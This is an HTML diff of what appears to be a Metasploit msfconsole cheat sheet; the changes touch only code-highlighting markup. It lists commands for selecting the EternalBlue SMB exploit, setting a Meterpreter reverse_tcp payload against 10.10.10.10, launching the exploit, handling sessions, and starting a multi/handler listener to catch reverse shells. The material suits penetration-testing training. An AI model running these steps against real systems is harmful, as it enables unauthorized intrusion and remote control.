@@ -126,60 +126,60 @@
 <p><strong>Metasploit</strong> is the world's most used penetration testing framework. <code>msfconsole</code> is the main interface.</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. Search Modules</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; search type:exploit platform:windows smb
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>type:exploit<span class="w"> </span>platform:windows<span class="w"> </span>smb
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Search for exploits matching specific criteria.</p>
 <h3>2. Select Module</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/windows/smb/ms17_010_eternalblue
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Select a module to configure.</p>
 <h3>3. Show Options</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; show options
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>show<span class="w"> </span>options
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Display parameters needed (RHOSTS, LHOST, etc.).</p>
 <h3>4. Set Target/Payload</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; set RHOSTS 10.10.10.10
-msf6 &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">10</span>.10.10.10
+msf6<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Configure the target IP and the payload to deliver.</p>
 <h3>5. Check Vulnerability</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; check
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>check
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Verify if the target is vulnerable without exploiting it (if supported).</p>
 <h3>6. Exploit/Run</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; exploit -j
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>exploit<span class="w"> </span>-j
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Launch attack. <code>-j</code> runs it in the background as a job.</p>
 <h3>7. Manage Sessions</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; sessions -l
-msf6 &gt; sessions -i 1
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>sessions<span class="w"> </span>-l
+msf6<span class="w"> </span>&gt;<span class="w"> </span>sessions<span class="w"> </span>-i<span class="w"> </span><span class="m">1</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> List active shells (<code>-l</code>) or interact (<code>-i</code>) with session ID 1.</p>
 <h3>8. Database Scan (Nmap)</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; db_nmap -sV 10.10.10.10
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>db_nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.10.10.10
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Run nmap and save results directly into the Metasploit database.</p>
 <h3>9. Create Workspace</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; workspace -a ProjectX
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>workspace<span class="w"> </span>-a<span class="w"> </span>ProjectX
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Isolate data into a named workspace.</p>
 <h3>10. Upgrade Shell</h3>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; sessions -u 1
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>sessions<span class="w"> </span>-u<span class="w"> </span><span class="m">1</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Attempt to upgrade a plain command shell to a Meterpreter session.</p>
 <h2>The Most Powerful Command</h2>
-<pre class="codehilite"><code class="language-bash">msf6 &gt; use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; exploit -j
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/multi/handler<span class="p">;</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="p">;</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span>tun0<span class="p">;</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span><span class="p">;</span><span class="w"> </span>exploit<span class="w"> </span>-j
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Starts a generic "Listener" (Handler) to catch incoming shells from any manual payloads (created with msfvenom).</p>
         </div>
